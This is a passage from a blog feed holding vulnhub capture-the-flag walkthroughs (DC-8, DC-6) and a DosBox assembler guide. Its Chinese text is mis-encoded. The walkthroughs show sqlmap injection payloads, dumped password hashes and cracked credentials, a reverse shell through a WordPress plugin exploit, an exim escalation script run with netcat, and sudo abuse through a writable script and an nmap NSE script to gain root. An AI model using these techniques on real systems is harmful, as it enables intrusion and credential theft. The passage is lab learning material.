class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1</span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=1 AND 1411=1411</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=1 AND (SELECT 2170 FROM(SELECT COUNT(*),CONCAT(0x71787a7071,(SELECT (ELT(2170=2170,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=1 AND (SELECT 6552 FROM (SELECT(SLEEP(5)))CMJv)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-8664 UNION ALL SELECT CONCAT(0x71787a7071,0x704978464268654b5753624b664c43695648527452644a6c6e78756d467852727a705a6648506d54,0x7171787871)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>ç¡®å®å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¼€å§‹æ³¨å…¥</p><p>ä¸­é—´è¿‡ç¨‹ç•¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"></span><br><span class="line">Database: d7db                                                                        </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨<code>john</code> ç ´è§£ï¼Œå¾—åˆ°johnçš„å¯†ç ä¸º<code>turtle</code></p><p>åˆ° webçš„ç™»é™†ç•Œé¢å»ï¼Œæ‰¾åˆ°ç™»é™†çš„åå°<code>http://192.168.2.156/user</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.æ²¡å¼€å¯ç®€æ´é“¾æ¥ï¼š</span><br><span class="line">    ?q&#x3D;user</span><br><span class="line">    index.php?q&#x3D;user</span><br><span class="line"></span><br><span class="line">2.å¼€å¯ç®€æ´é“¾æ¥</span><br><span class="line">    &#x2F;user</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨johnçš„è´¦æˆ·ç™»é™†ï¼Œå‘ç°æœ‰åœ°æ–¹å¯ä»¥edit</p><img src="./DC-8/image-20200706181126430.png" alt="image-20200706181126430" style="zoom:50%;" /><img src="./DC-8/image-20200706181156986.png" alt="image-20200706181156986" style="zoom:50%;" /><p>æœ¬åœ°ç›‘å¬ï¼Œåœ¨<code>contract us</code>ç•Œé¢éšä¾¿å†™ä¸€ç‚¹ï¼Œç„¶åsubmitï¼Œå¾—åˆ°webshell</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹çš„æ˜¯exim ææƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:/var/www/html$ searchsploit exim</span><br></pre></td></tr></table></figure><img src="./DC-8/image-20200706181516266.png" alt="image-20200706181516266" style="zoom:50%;" /><p>åœ¨kaliä¸­å¼€å¯<code>apache2</code>ï¼Œåœ¨é¶æœºä½¿ç”¨wget è·å–æ–‡ä»¶</p><p>è¿è¡Œ<code>./46996.sh -m netcat</code></p><blockquote><p>  -m setuid ä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œï¼Œnetcatå€’æ˜¯å¯ä»¥</p></blockquote><img src="./DC-8/image-20200706181705588.png" alt="image-20200706181705588" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> sql-injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DosBox çš„ä½¿ç”¨æ–¹æ³•</title>
      <link href="/DosBox.html"/>
      <url>/DosBox.html</url>
      
        <content type="html"><![CDATA[<p>Windowsä¸‹<code>DosBox</code>çš„ä½¿ç”¨æ–¹æ³•</p><a id="more"></a><h1 id="DosBox-ä½¿ç”¨æ–¹æ³•"><a href="#DosBox-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="DosBox ä½¿ç”¨æ–¹æ³•"></a>DosBox ä½¿ç”¨æ–¹æ³•</h1><h2 id="å¸¸ç”¨ç¨‹åº"><a href="#å¸¸ç”¨ç¨‹åº" class="headerlink" title="å¸¸ç”¨ç¨‹åº"></a>å¸¸ç”¨ç¨‹åº</h2><ul><li>masm</li><li>link</li><li>debug</li></ul><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ul><li>æŒ‚è½½ç›˜ç¬¦<ul><li>ä½¿ç”¨å‘½ä»¤ <code>mount desk location</code>,å…¶ä¸­desk æ˜¯è™šæ‹Ÿç›˜ç¬¦å‘½ï¼Œå¯ä»¥è‡ªå·±å‘½åï¼Œlocationå¯ä»¥æ˜¯ä¸€ä¸ªç›˜( C D E)ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹<ul><li>ä¾‹å¦‚æˆ‘æƒ³æŒ‚è½½çš„è·¯å¾„ä¸º <code>E:\asm\dosbox-0.74\tools</code>ï¼Œå¹¶å‘½åä¸ºXç›˜ï¼Œåˆ™è¾“å…¥å‘½ä»¤<code>mount x E:\asm\dosbox-0.74\tools</code>ï¼Œè¿™ä¸ªæ—¶å€™å°±æŠŠXç›˜ï¼ˆè™šæ„çš„ï¼‰ç»‘å®šåˆ°äº†è¿™ä¸ªç›®å½•ä¸‹é¢ï¼Œç„¶åè¾“å…¥<code>x:</code>è¿›å…¥è¯¥ç›®å½•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</li></ul></li></ul></li></ul><p><a href="http://49.234.181.139/wp-content/uploads/2019/12/1.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/1-300x59.png"></a></p><ul><li>è¿™é‡Œæ¨èæŠŠç›˜ç¬¦æŒ‚è½½åˆ°<strong>masm.exe</strong>æ‰€åœ¨çš„ç›®å½•ï¼Œä¸ºäº†ä»¥åä½¿ç”¨æ–¹ä¾¿</li></ul><h2 id="masm-exe"><a href="#masm-exe" class="headerlink" title="masm.exe"></a>masm.exe</h2><p>æ˜¯ç¼–è¯‘ç¨‹åºï¼Œç”¨æ¥ç¼–è¯‘æ±‡ç¼–æ–‡ä»¶ï¼Œç¼–è¯‘å®Œæˆä¹‹åä¼šäº§ç”Ÿä¸€ä¸ª<code>.obj</code>æ–‡ä»¶</p><p>è¾“å…¥å‘½ä»¤<code>masm *.asm</code>,è¿™é‡Œçš„*æ˜¯æŒ‡ä½ çš„æ–‡ä»¶åç§°ï¼Œä¾‹å¦‚<code>masm 2.asm</code>ï¼Œå¦‚æœä½ çš„ç¨‹åºæ²¡æœ‰é”™è¯¯çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆè¿™æ ·</p><p><a href="http://49.234.181.139/wp-content/uploads/2019/12/2.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/2-300x52.png"></a></p><p>è¦æ±‚è¾“å…¥çš„æ˜¯objæ–‡ä»¶çš„åå­—ï¼Œå¦‚æœæƒ³å’Œasmæ–‡ä»¶çš„åç§°ä¸€æ ·å°±ç›´æ¥å›è½¦è·³è¿‡ï¼Œæˆ–è€…ä½¿ç”¨<code>masm 2.asm;</code>ï¼Œå³åŠ å…¥ä¸€ä¸ª <code>;</code>ï¼Œ<br><a href="http://49.234.181.139/wp-content/uploads/2019/12/4.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/4-300x161.png"></a></p><p>ä¸¤ç§æ–¹æ³•ç»“æœå¦‚å›¾æ‰€ç¤º</p><h2 id="link-exe"><a href="#link-exe" class="headerlink" title="link.exe"></a>link.exe</h2><p>linkæ˜¯ç”¨æ¥å°†objæ–‡ä»¶é“¾æ¥æˆexeæ–‡ä»¶çš„å·¥å…·ï¼Œè¿è¡Œå®Œä¹‹åï¼Œå¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªexeæ–‡ä»¶</p><p><code>link *.obj</code> è¿™ä¸ª* ä¹Ÿæ˜¯æ–‡ä»¶åçš„æ ·å­ï¼Œè¿è¡Œç»“æœå¦‚ä¸‹</p><p><a href="http://49.234.181.139/wp-content/uploads/2019/12/3.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/3-300x195.png"></a></p><p>ä¹Ÿæ˜¯å¯ä»¥åŠ å…¥<code>;</code>çš„</p><p>é“¾æ¥å®Œä¹‹åäº§ç”Ÿçš„exeå°±æ˜¯å¯æ‰§è¡Œæ–‡ä»¶äº†ï¼Œè¾“å…¥<code>*.exe</code>å¯ä»¥ç›´æ¥è¿è¡Œ</p><h2 id="debug-exe"><a href="#debug-exe" class="headerlink" title="debug.exe"></a>debug.exe</h2><p>debug.exeæ˜¯è°ƒè¯•ç”¨çš„å·¥å…·ï¼Œ</p><p><code>debug [filename]</code> filenameæ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå¦‚æœä¸ç»™å‡ºçš„è¯ï¼Œå°±ä¼šè¿›å…¥ä¸€èˆ¬çš„debugç•Œé¢(ä¸windows XPçš„debugä¸€æ ·)ï¼Œå¦‚æœç»™å‡ºfilename åˆ™ä¼šè°ƒè¯•è¿™ä¸ªç¨‹åº</p><p>ä¾‹å¦‚ <code>debug 2.exe</code></p><p><a href="http://49.234.181.139/wp-content/uploads/2019/12/5.png"><img src="http://49.234.181.139/wp-content/uploads/2019/12/5.png"></a></p><p>ç„¶åå°±å¯ä»¥ä½¿ç”¨debugçš„å‘½ä»¤å»è°ƒè¯•</p><h3 id="debugå‘½ä»¤"><a href="#debugå‘½ä»¤" class="headerlink" title="debugå‘½ä»¤"></a>debugå‘½ä»¤</h3><p><a href="https://jingyan.baidu.com/article/a65957f433f60924e67f9b07.html">ç™¾åº¦ç»éªŒ</a> </p><p><a href="%5Bhttps://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin%5D(https://baike.baidu.com/item/debug%E5%91%BD%E4%BB%A4/10080524?fr=aladdin)">ç™¾åº¦ç™¾ç§‘</a></p><h1 id="FIN"><a href="#FIN" class="headerlink" title="FIN"></a>FIN</h1><h2 id="ps-æœ‰å•¥ä¸æ‡‚çš„é—®WXRå°±å®Œäº‹äº†"><a href="#ps-æœ‰å•¥ä¸æ‡‚çš„é—®WXRå°±å®Œäº‹äº†" class="headerlink" title="ps:æœ‰å•¥ä¸æ‡‚çš„é—®WXRå°±å®Œäº‹äº†"></a>ps:æœ‰å•¥ä¸æ‡‚çš„é—®WXRå°±å®Œäº‹äº†</h2>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-6é¶æœº</title>
      <link href="/DC-6.html"/>
      <url>/DC-6.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ DC-6 é¶æœº</p><p>åˆå­¦è€…éš¾åº¦</p><a id="more"></a><h3 id="é¶æœºåœ°å€"><a href="#é¶æœºåœ°å€" class="headerlink" title="é¶æœºåœ°å€"></a>é¶æœºåœ°å€</h3><p><a href="https://www.vulnhub.com/entry/dc-6,315/">vulnhub DC-6</a></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="NMAPæ‰«æå¾—åˆ°IP"><a href="#NMAPæ‰«æå¾—åˆ°IP" class="headerlink" title="NMAPæ‰«æå¾—åˆ°IP"></a>NMAPæ‰«æå¾—åˆ°IP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for wordy (192.168.147.135)</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure><p>è¯¦ç»†æ‰«æ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.147.135 -A -p0-65535</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.135</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 79 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure><p>éœ€è¦ä¿®æ”¹<code>hosts</code>æ–‡ä»¶è®¿é—®<code>http://wordy</code><br>ç„¶åå°±å¯ä»¥è®¿é—®ç½‘ç«™äº†</p><h3 id="é’ˆå¯¹WordPressçš„æ”»å‡»"><a href="#é’ˆå¯¹WordPressçš„æ”»å‡»" class="headerlink" title="é’ˆå¯¹WordPressçš„æ”»å‡»"></a>é’ˆå¯¹WordPressçš„æ”»å‡»</h3><p>ä½¿ç”¨<code>wpscan</code>å·¥å…·æ‰«æç”¨æˆ·å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy --enumerate u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>æ‰«æå‡ºæ¥çš„ç”¨æˆ·å,åŠ ä¸Šä½œè€…ç»™çš„æç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OK, this isn&#39;t really a clue as such, but more of some &quot;we don&#39;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure><p>åˆ›å»ºå¥½å­—å…¸ä¹‹åçˆ†ç ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U user -P password.txt</span><br><span class="line"></span><br><span class="line">[SUCCESS] - mark / helpdesk01</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>mark</code>çš„è´¦æˆ·ç™»å½•è¿›å»<br>æŸ¥çœ‹ä¸€ä¸‹,æ²¡æœ‰å¯ä»¥æŒ‚é©¬çš„åœ°æ–¹å•Š???<br><a href="https://cloud.tencent.com/developer/article/1472276">å¸ˆå‚…çš„WP</a>ä¸Šè¯´<code>activity monitor</code> å­˜åœ¨æ¼æ´,ç”¨<code>searchsploit</code>æŸ¥ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit activity monitor</span><br><span class="line"></span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Comm | exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure><p>æ”¹ä¸€ä¸‹å‚æ•°å°±å¯ä»¥æ‰§è¡Œä¸€ä¸ªåå¼¹shell</p><h3 id="ææƒåˆ°graham"><a href="#ææƒåˆ°graham" class="headerlink" title="ææƒåˆ°graham"></a>ææƒåˆ°graham</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/vulnhub/dc-6# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.135] 49302</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ç”¨æˆ·ç›®å½•å’Œé‡Œé¢çš„ä¸œè¥¿,åœ¨<code>/home/mark/stuff/</code>é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¤‡å¿˜å½•?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls /home/mark/stuff -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .</span><br><span class="line">drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..</span><br><span class="line">-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt</span><br></pre></td></tr></table></figure><p>é‡Œé¢ç›´æ¥å†™äº†ç”¨æˆ·åå¯†ç (â€¦)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat things*</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br></pre></td></tr></table></figure><p>ç”¨sshè¿æ¥ä¸Šå»</p><h3 id="ææƒåˆ°jens"><a href="#ææƒåˆ°jens" class="headerlink" title="ææƒåˆ°jens"></a>ææƒåˆ°jens</h3><p>æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥ææƒçš„ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al /home/jens</span><br><span class="line"></span><br><span class="line">-rwxrwxr-x 1 jens devs   61 Apr  9 16:37 backups.sh</span><br></pre></td></tr></table></figure><p>å±…ç„¶å¯å†™,é‚£å°±æŠŠå®ƒé‡Œé¢æ”¹æˆ<code>/bin/bash</code>,å°±èƒ½å¾—åˆ°ä¸€ä¸ª<code>jens</code>çš„shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ cat backups.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tar -czf backups.tar.gz /var/www/html</span></span><br><span class="line">/bin/bash</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line">jens@dc-6:~$ whoami</span><br><span class="line">jens</span><br></pre></td></tr></table></figure><h3 id="ææƒåˆ°root"><a href="#ææƒåˆ°root" class="headerlink" title="ææƒåˆ°root"></a>ææƒåˆ°root</h3><p>ç»§ç»­æ‰¾èƒ½å¤Ÿææƒçš„ç©æ„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure><p>nmap æ€ä¹ˆææƒå•Š?å¸ˆå‚…çš„WPä¸Šé¢è¯´ç”¨<code>nse</code>ææƒ,æ‰€ä»¥åˆ›å»ºä¸€ä¸ªè„šæœ¬æ–‡ä»¶å°±è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ cat rooter </span><br><span class="line">os.execute(&quot;/bin/sh&quot;);</span><br><span class="line">jens@dc-6:~$ sudo nmap localhost --script=rooter</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-09 17:22 AEST</span><br><span class="line">NSE: Warning: Loading &#x27;rooter&#x27; -- the recommended file extension is &#x27;.nse&#x27;.</span><br><span class="line"><span class="meta">#</span><span class="bash"> root</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»ˆç«¯ä¸ä¼šæœ‰å›æ˜¾è‡ªå·±çš„å­—ç¬¦,ç”¨<code>reset</code>å‘½ä»¤é‡ç½®ç»ˆç«¯å°±æ­£å¸¸äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">root@dc-6:/home/jens# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@dc-6:/home/jens# cat /root/</span><br><span class="line">.bash_history   .mysql_history  .profile        </span><br><span class="line">.bashrc         .nano/          theflag.txt     </span><br><span class="line">root@dc-6:/home/jens# cat /root/theflag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> DC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC-4é¶æœº</title>
      <link href="/DC-4.html"/>
      <url>/DC-4.html</url>
      
